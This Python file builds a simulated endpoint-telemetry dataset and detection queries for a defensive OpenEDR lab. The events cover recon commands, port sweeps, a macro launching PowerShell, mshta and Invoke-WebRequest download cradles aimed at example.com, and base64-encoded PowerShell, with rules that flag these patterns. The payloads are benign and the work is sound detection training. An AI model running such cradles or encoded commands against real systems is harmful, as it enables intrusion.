"""Single source of truth for the SIMULATED OpenEDR lab dataset.
Everything here is synthetic. Nothing was captured from a live system."""
import base64
from datetime import datetime, timedelta

SIM_LABEL = "SIMULATED EVIDENCE – NOT CAPTURED FROM A LIVE SYSTEM"
HOST, VM_IP, NAT_IP, MON_IP = "WIN11-LAB01", "192.168.56.101", "10.0.3.15", "192.168.56.1"
WEB_IP = "203.0.113.10"     # RFC 5737 documentation address standing in for example.com
DAY = "2026-11-05"

PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
S32 = "C:\\Windows\\System32\\"
PATHS = {
    "explorer.exe": r"C:\Windows\explorer.exe",
    "powershell.exe": PS,
    "winword.exe": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
    "msedge.exe": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "svchost.exe": S32 + "svchost.exe",
    "splwow64.exe": r"C:\Windows\splwow64.exe",
    "System": "System",
}


def exe(n):
    return PATHS.get(n, S32 + n)


def ts(hms, ms=0):
    t = datetime.strptime(f"{DAY} {hms}", "%Y-%m-%d %H:%M:%S") + timedelta(milliseconds=ms)
    return t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond // 1000:03d}Z"


EVENTS = []


def _base(eid, t, role, scenario, user):
    return {"_id": eid, "_role": role, "_scenario": scenario, "@timestamp": t,
            "host.name": HOST, "user.name": user, "user.domain": "LAB"}


def proc(eid, t, name, cmd, pid, parent, ppid, role="sim", scenario="", user="student"):
    e = _base(eid, t, role, scenario, user)
    e.update({"event.category": "process", "event.action": "process_create",
              "openedr.baseEventType": 1, "process.pid": pid, "process.name": name,
              "process.executable": exe(name), "process.command_line": cmd,
              "process.parent.pid": ppid, "process.parent.name": parent,
              "process.parent.executable": exe(parent)})
    EVENTS.append(e)
    return e


def net(eid, t, name, pid, direction, sip, sport, dip, dport, role="sim", scenario="", user="student"):
    e = _base(eid, t, role, scenario, user)
    out = direction == "outbound"
    e.update({"event.category": "network",
              "event.action": "network_connect_out" if out else "network_connect_in",
              "openedr.baseEventType": 40 if out else 39,
              "process.pid": pid, "process.name": name, "process.executable": exe(name),
              "network.direction": direction, "network.transport": "tcp",
              "source.ip": sip, "source.port": sport, "destination.ip": dip, "destination.port": dport})
    EVENTS.append(e)
    return e


def fil(eid, t, name, pid, path, role="sim", scenario="", user="student"):
    e = _base(eid, t, role, scenario, user)
    e.update({"event.category": "file", "event.action": "file_create", "openedr.baseEventType": 3,
              "process.pid": pid, "process.name": name, "process.executable": exe(name),
              "file.path": path, "file.name": path.rsplit("\\", 1)[-1]})
    EVENTS.append(e)
    return e


# ---- baseline / checkpoint ---------------------------------------------------------------
proc("CTL-01", ts("09:40:05"), "ipconfig.exe", "ipconfig /all", 3312, "cmd.exe", 3120, "control", "R1")
proc("CK-01", ts("10:02:11"), "notepad.exe", '"C:\\Windows\\System32\\notepad.exe"', 4108,
     "explorer.exe", 2284, "checkpoint", "CK")

# ---- R1: host reconnaissance -------------------------------------------------------------
proc("CTL-02", ts("10:13:40"), "powershell.exe", "powershell.exe", 6120, "explorer.exe", 2284, "control", "R1")


def q(n):
    return '"C:\\Windows\\system32\\' + n + '"'


R1 = [("10:14:03", 120, "whoami.exe", q("whoami.exe") + " /all", 6204, "powershell.exe", 6120),
      ("10:14:06", 410, "net.exe", q("net.exe") + " user", 6232, "powershell.exe", 6120),
      ("10:14:06", 455, "net1.exe", "C:\\Windows\\system32\\net1 user", 6240, "net.exe", 6232),
      ("10:14:09", 80, "net.exe", q("net.exe") + ' group "Domain Admins" /domain', 6268, "powershell.exe", 6120),
      ("10:14:09", 130, "net1.exe", 'C:\\Windows\\system32\\net1 group "Domain Admins" /domain', 6276, "net.exe", 6268),
      ("10:14:13", 300, "nltest.exe", q("nltest.exe") + " /dclist:", 6312, "powershell.exe", 6120),
      ("10:14:16", 720, "systeminfo.exe", q("systeminfo.exe"), 6348, "powershell.exe", 6120),
      ("10:14:29", 40, "ipconfig.exe", q("ipconfig.exe") + " /all", 6420, "powershell.exe", 6120),
      ("10:14:31", 610, "arp.exe", q("ARP.EXE") + " -a", 6452, "powershell.exe", 6120),
      ("10:14:34", 200, "net.exe", q("net.exe") + " view", 6488, "powershell.exe", 6120),
      ("10:14:41", 15, "tasklist.exe", q("tasklist.exe"), 6524, "powershell.exe", 6120)]
for i, (h, ms, n, c, pid, par, ppid) in enumerate(R1, 1):
    proc(f"R1-{i:02d}", ts(h, ms), n, c, pid, par, ppid, "sim", "R1")

# ---- R2: outbound sweep (assignment command: 1..25, port 445) and inbound scan -----------
for i in range(1, 26):
    s = 2 + (i - 1) * 2
    net(f"R2O-{i:02d}", ts(f"10:31:{s:02d}"), "powershell.exe", 6120, "outbound", VM_IP, 50100 + i,
        f"192.168.56.{i}", 445, "sim", "R2")
PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723,
         3306, 3389, 5357, 5900, 5985, 7680, 8080, 8443]
for i, p in enumerate(PORTS, 1):
    net(f"R2I-{i:02d}", ts("10:38:12", (i - 1) * 400), "System", 4, "inbound", MON_IP, 41000 + i, VM_IP, p,
        "sim", "R2", user="SYSTEM")
for i, ip in enumerate(["198.51.100.21", "198.51.100.22", "198.51.100.23"], 1):
    net(f"CTL-03{'abc'[i - 1]}", ts("10:45:05", i * 900), "msedge.exe", 7010, "outbound", NAT_IP,
        50600 + i, ip, 443, "control", "R2")
net("CTL-04", ts("10:47:30"), "System", 4, "inbound", "192.168.56.5", 49822, VM_IP, 3389, "control", "R2", user="SYSTEM")

# ---- S1: weaponised document --------------------------------------------------------------
proc("S1-01", ts("10:52:10", 200), "winword.exe",
     '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\student\\Downloads\\lab_invoice.docm"',
     7420, "explorer.exe", 2284, "sim", "S1")
proc("S1-02", ts("10:52:18", 640), "powershell.exe",
     'powershell -NoProfile -Command "Write-Host lab-macro-fired"', 7588, "winword.exe", 7420, "sim", "S1")
proc("CTL-05", ts("10:53:02"), "splwow64.exe", "C:\\Windows\\splwow64.exe 12288", 7612,
     "winword.exe", 7420, "control", "S1")

# ---- S2: phishing link and download cradle ------------------------------------------------
TEMP = "C:\\Users\\student\\AppData\\Local\\Temp"
proc("S2-01", ts("11:07:15", 220), "powershell.exe",
     'powershell -NoProfile -Command "Invoke-WebRequest https://example.com -OutFile $env:TEMP\\lab_fetch.txt"',
     5512, "explorer.exe", 2284, "sim", "S2")
net("S2-02", ts("11:07:16", 310), "powershell.exe", 5512, "outbound", NAT_IP, 50844, WEB_IP, 443, "sim", "S2")
fil("S2-03", ts("11:07:16", 870), "powershell.exe", 5512, TEMP + "\\lab_fetch.txt", "sim", "S2")
proc("S2-04", ts("11:19:40", 100), "mshta.exe", "mshta.exe https://example.com/lab_probe.hta", 5736,
     "explorer.exe", 2284, "sim", "S2")
net("S2-05", ts("11:19:41", 50), "mshta.exe", 5736, "outbound", NAT_IP, 50871, WEB_IP, 443, "sim", "S2")
proc("CTL-06", ts("11:22:10"), "rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl", 5820,
     "explorer.exe", 2284, "control", "S2")
proc("CTL-07", ts("11:24:00"), "powershell.exe", "powershell -NoProfile -File C:\\IT\\inventory.ps1", 5866,
     "cmd.exe", 5850, "control", "S2")
proc("FP-01", ts("11:26:30"), "powershell.exe",
     'powershell -NoProfile -Command "Invoke-WebRequest https://updates.lab.example/agent.msi -OutFile C:\\IT\\agent.msi"',
     5902, "svchost.exe", 1180, "false-positive", "S2", user="SYSTEM")
net("FP-01b", ts("11:26:31", 200), "powershell.exe", 5902, "outbound", NAT_IP, 50902, "198.51.100.40", 443,
    "false-positive", "S2", user="SYSTEM")
fil("FP-01c", ts("11:26:33", 400), "powershell.exe", 5902, "C:\\IT\\agent.msi", "false-positive", "S2", user="SYSTEM")

# ---- S3: fake IT / ClickFix ---------------------------------------------------------------
B64 = base64.b64encode("Write-Host clickfix-lab".encode("utf-16-le")).decode()
proc("S3-01", ts("11:32:10"), "powershell.exe", 'powershell -NoProfile -Command "Write-Host clickfix-lab"',
     6010, "explorer.exe", 2284, "miss", "S3")
proc("S3-02", ts("11:33:20", 450), "powershell.exe",
     "powershell -NoProfile -Command \"iex 'Write-Host clickfix-lab'\"", 6044, "explorer.exe", 2284, "sim", "S3")
proc("S3-03", ts("11:34:05"), "powershell.exe", f"powershell -nop -enc {B64}", 6078, "explorer.exe", 2284, "sim", "S3")
proc("S3-04", ts("11:35:00"), "powershell.exe", f"powershell -NoProfile -e {B64}", 6102, "explorer.exe", 2284, "miss", "S3")
proc("S3-05", ts("11:35:40"), "powershell.exe", f"powershell -NoProfile -EncodedCommand {B64}", 6130,
     "explorer.exe", 2284, "miss", "S3")
proc("FP-02", ts("11:38:15"), "powershell.exe", 'powershell -Command "Start-Process https://intranet.lab.example/helpdesk"',
     6166, "explorer.exe", 2284, "false-positive", "S3")

# ---- noisy administrator: drives the R1 false-positive discussion -------------------------
for i, (h, n, c, pid) in enumerate([("12:10:04", "ipconfig.exe", "ipconfig /all", 8102),
                                    ("12:10:52", "whoami.exe", "whoami", 8130),
                                    ("12:11:37", "tasklist.exe", "tasklist", 8166),
                                    ("12:12:44", "systeminfo.exe", "systeminfo", 8198),
                                    ("12:13:20", "arp.exe", "arp -a", 8220)], 1):
    proc(f"FP-A{i}", ts(h), n, c, pid, "cmd.exe", 8090, "false-positive", "R1", user="itadmin")

EVENTS.sort(key=lambda e: e["@timestamp"])

# ---- detection queries --------------------------------------------------------------------
_DISC = '''("whoami.exe" or "net.exe" or "net1.exe"
  or "nltest.exe" or "systeminfo.exe" or "ipconfig.exe" or "arp.exe"
  or "tasklist.exe" or "hostname.exe")'''
QUERIES = {
    "R1": 'event.category : "process" and process.name : ' + _DISC,
    "R1-TUNED": 'event.category : "process" and process.name : ' + _DISC + '''
  and process.parent.name : ("powershell.exe" or "wscript.exe" or "cscript.exe"
  or "winword.exe" or "excel.exe")''',
    "R2-OUT": '''event.category : "network" and network.direction : "outbound"
  and process.name : ("powershell.exe" or "nmap.exe" or "crackmapexec.exe")''',
    "R2-IN": 'event.category : "network" and network.direction : "inbound"',
    "S1": '''event.category : "process"
  and process.parent.name : ("winword.exe" or "excel.exe" or "powerpnt.exe" or "outlook.exe")
  and process.name : ("powershell.exe" or "cmd.exe" or "wscript.exe" or "cscript.exe"
  or "mshta.exe" or "rundll32.exe" or "regsvr32.exe")''',
    "S2-LOLBIN": '''event.category : "process"
  and process.name : ("mshta.exe" or "regsvr32.exe" or "rundll32.exe")
  and process.command_line : (*http* or *.hta or *scrobj* or *javascript:*)''',
    "S2-PS": '''event.category : "process" and process.name : "powershell.exe"
  and process.command_line : (*DownloadString* or *DownloadFile* or *Invoke-WebRequest*
  or *Net.WebClient* or *iwr* or *curl*)''',
    "S2-PS-TUNED": '''event.category : "process" and process.name : "powershell.exe"
  and process.command_line : (*DownloadString* or *DownloadFile* or *Invoke-WebRequest*
  or *Net.WebClient* or *iwr* or *curl*)
  and process.parent.name : ("explorer.exe" or "msedge.exe" or "chrome.exe" or "firefox.exe"
  or "winword.exe" or "excel.exe" or "outlook.exe")''',
    "S3": '''event.category : "process" and process.parent.name : "explorer.exe"
  and process.name : ("powershell.exe" or "cmd.exe" or "mshta.exe")
  and process.command_line : (*-enc* or *-w hidden* or *http* or *DownloadString*
  or *iex* or *Invoke-Expression*)''',
}


def _r(prefix, n):
    return {f"{prefix}{i:02d}" for i in range(1, n + 1)}


# Hand-written expectations. The validator fails if the evaluator disagrees with any of these.
EXPECTED = {
    "R1": _r("R1-", 11) | {"CTL-01"} | {f"FP-A{i}" for i in range(1, 6)},
    "R1-TUNED": _r("R1-", 11) - {"R1-03", "R1-05"},
    "R2-OUT": _r("R2O-", 25) | {"S2-02", "FP-01b"},
    "R2-IN": _r("R2I-", 24) | {"CTL-04"},
    "S1": {"S1-02"},
    "S2-LOLBIN": {"S2-04"},
    "S2-PS": {"S2-01", "FP-01"},
    "S2-PS-TUNED": {"S2-01"},
    "S3": {"S2-01", "S2-04", "S3-02", "S3-03", "FP-02"},
}
